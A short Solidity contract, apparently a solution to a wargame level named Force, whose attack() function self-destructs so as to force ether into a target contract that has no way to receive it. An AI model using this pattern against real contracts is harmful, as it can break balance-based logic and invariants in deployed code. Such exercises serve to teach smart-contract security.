//SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.0;

import "./Force.sol";

contract SelfDestruct {
    Force force;

    constructor(address _forceAddress) public {
        force = Force(_forceAddress);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
